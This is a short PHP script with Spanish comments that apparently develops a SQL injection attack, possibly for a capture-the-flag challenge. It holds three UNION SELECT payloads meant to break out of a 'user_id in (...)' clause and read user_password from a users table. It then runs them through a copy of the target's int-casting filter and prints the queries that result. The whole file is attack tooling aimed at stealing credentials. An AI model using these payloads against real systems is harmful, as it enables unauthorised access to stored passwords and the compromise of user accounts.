<?php
// Nueva estrategia: hacer que el selector final sea SQL válido
// Opción 1: Usar GROUP_CONCAT o similar para evitar comas
// Opción 2: Cerrar el IN() antes del UNION

// La query es: WHERE (user_id in (SELECTOR));
// Quiero: WHERE (user_id in (1)) UNION SELECT ...--;

$payloads = [
    // Sin comas adicionales después del 1))
    "0,0,1)) UNION SELECT user_id||0||user_password x,x,x FROM users--",
    "0,0,1)) UNION SELECT 1,1,user_password FROM users--",
    "0,0,1)) UNION ALL SELECT 1,1,user_password FROM users--",
];

foreach ($payloads as $payload) {
    echo "\n" . str_repeat("=", 70) . "\n";
    echo "Payload: $payload\n";
    echo "Length: " . strlen($payload) . " chars\n";
    
    if (strlen($payload) > 70) {
        echo "❌ TOO LONG!\n";
        continue;
    }
    
    $tmp = explode(',', $payload);
    for ($i = 0; $i < count($tmp); $i++) {
        $tmp[$i] = (int)$tmp[$i];
        if($tmp[$i] < 1) {
            unset($tmp[$i]);
        }
    }
    
    $selector = implode(',', array_unique($tmp));
    echo "Selector: '$selector'\n";
    
    $query = "SELECT user_id, user_privileges, user_name FROM users WHERE (user_id in (" . $selector . "));";
    echo "Query:\n$query\n";
}
?>
